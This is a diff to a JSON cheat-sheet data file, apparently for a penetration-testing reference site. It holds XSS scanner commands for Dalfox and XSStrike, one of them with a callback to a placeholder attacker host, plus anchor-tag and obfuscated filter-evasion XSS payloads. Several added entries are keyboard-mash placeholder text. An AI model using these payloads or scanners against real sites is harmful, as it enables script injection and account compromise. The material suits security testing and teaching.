@@ -445,7 +445,7 @@
   {
     "id": 37,
     "title": "XSS (Cross-Site Scripting) Automation",
-    "content": "Dalfox\n<copycode>\n# -b: Callback url <br>\ndalfox url https://example.com/?q=test -b http://<attack-ip>:<attack-port><br>\n<br>\n# -X: Method<br>\n# --data: POST data<br>\ndalfox url https://example.com/contact -X POST --data \"email=test&message=test\" -b http://<attack-ip>:<attack-port><br>\n</copycode><br>\nXSStrike<br>\n<copycode>\n# GET request<br>\npython xsstrike.py -u http://vulnerable.com/?param=test<br>\n<br>\n# POST reqeust<br>\npython xsstrike.py -u http://vulnerable.com/post --data \"username=test&email=test&comment=test\"<br>\n<br>\n# data as JSON<br>\npython xsstrike.py -u http://vulnerable.com/comment --data '{\"comment\": \"test\"}' --json<br>\n</copycode><br>\n",
+    "content": "Dalfox\n<copycode>\n# -b: Callback url <br> dalfox url https://example.com/?q=test -b http://<attack-ip>:<attack-port><br>\n<br>\n# -X: Method<br>\n# --data: POST data<br>\ndalfox url https://example.com/contact -X POST --data \"email=test&message=test\" -b http://<attack-ip>:<attack-port><br>\n</copycode><br>\nXSStrike<br>\n<copycode>\n# GET request<br>\npython xsstrike.py -u http://vulnerable.com/?param=test<br>\n<br>\n# POST reqeust<br>\npython xsstrike.py -u http://vulnerable.com/post --data \"username=test&email=test&comment=test\"<br>\n<br>\n# data as JSON<br>\npython xsstrike.py -u http://vulnerable.com/comment --data '{\"comment\": \"test\"}' --json<br>\n</copycode><br>\n",
     "keywords": [
       "xss",
       "automation",
@@ -519,7 +519,7 @@
   {
     "id": 43,
     "title": "xss, payload, anchor tag",
-    "content": "<copycode>\n<a onmouseover=alert(1)>click</a><br>\n<a href=\"javascript:alert(1)\">Click</a><br>\n</copycode>",
+    "content": "<copycode><a onmouseover=alert(1)>click</a>\n<a href=\"javascript:alert(1)\">Click</a><br>\n</copycode>",
     "keywords": [
       "xss",
       "payload",
@@ -574,5 +574,59 @@
       "script"
     ],
     "category": "xss"
+  },
+  {
+    "id": 48,
+    "title": "test",
+    "content": "test\njhdjhskldsajjk\n././918712324=-32kl23\"e/'dlw=-dosd90sdl\n]'sdsal;du90e823ew\nD?Wd@!#@#$#TR ./vrfjer\nr345#$%@#rl234\n34\n1\ne#r34243r34r#$R$%T$%Y^%U^&I&*@@!@!@@!~~!~!32\ne2e\n23434\n534564565445\n75635l345j6eiofevejkdvdkw\\]",
+    "keywords": [
+      "test"
+    ],
+    "category": "test"
+  },
+  {
+    "id": 49,
+    "title": "test 2",
+    "content": "<copycode>dksdksdsd\n<br>sdsdksds\ndskjkads\n\nsjdjdjhsd: djksdsjk&quot;\n <br>      sdjsjdsdhsksjdsjk\nskjjkasdjlksakl\nsd\n\ndsoadhkjdklasdkssdsd\nkksdlkasds\nasdsajkdadwui9dskladms\nsdbsajks   \\\nssdsdssal\n <br>       osdjkadjksdjkas\n                  ksjdhasjlajdlasdjsdispas\n                            adhiasdhsidjopsadjsads\n                                       jsdssjsjgasakaisdjsadshjdsad\nsdsdisdbjksadbsds\nadsjadjksds\nsdsadkajdakjdskadkad\n                  jdasdjlsadsajdsassdsiaa\n                                  djosadjksdsjkadsajshdsadsp\n                                              dsjiodjsdjklsjlksjslds\n                                                            sodjsadjksdsdsa\n                                                                       iosdjoasidjajsajsa <br> ducky</copycode>",
+    "keywords": [
+      "test2"
+    ],
+    "category": "test2"
+  },
+  {
+    "id": 50,
+    "title": "test3",
+    "content": "&quot;-prompt(8)-&quot;\n&#x27;-prompt(8)-&#x27;\n&quot;;a=prompt,a()//\n&#x27;;a=prompt,a()//\n&#x27;-eval(&quot;window[&#x27;pro&#x27;%2B&#x27;mpt&#x27;](8)&quot;)-&#x27;\n&quot;-eval(&quot;window[&#x27;pro&#x27;%2B&#x27;mpt&#x27;](8)&quot;)-&quot;\n&quot;onclick=prompt(8)&gt;&quot;@x.y\n&quot;onclick=prompt(8)&gt;&lt;svg/onload=prompt(8)&gt;&quot;@x.y\n&lt;image/src/onerror=prompt(8)&gt;\n&lt;img/src/onerror=prompt(8)&gt;\n&lt;image src/onerror=prompt(8)&gt;\n&lt;img src/onerror=prompt(8)&gt;\n&lt;image src =q onerror=prompt(8)&gt;\n&lt;img src =q onerror=prompt(8)&gt;\n&lt;/scrip&lt;/script&gt;t&gt;&lt;img src =q onerror=prompt(8)&gt;\n&lt;script\\x20type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;\n&lt;script\\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;",
+    "keywords": [
+      "test3"
+    ],
+    "category": "test3"
+  },
+  {
+    "id": 51,
+    "title": "test3",
+    "content": "tksjjks]sdjkfsklads[\n\nd;osds&#x27;adsd\nsadsd&#x27;sad\nadsads\nDSADSJADPASDSADSAKDS\nASJKDALDS\nAADASDNJKLA",
+    "keywords": [
+      "test3"
+    ],
+    "category": "test3"
+  },
+  {
+    "id": 52,
+    "title": "test11",
+    "content": "test11",
+    "keywords": [
+      "test11"
+    ],
+    "category": "test11"
+  },
+  {
+    "id": 53,
+    "title": "test11",
+    "content": "test11",
+    "keywords": [
+      "test11"
+    ],
+    "category": "test11"
   }
 ]
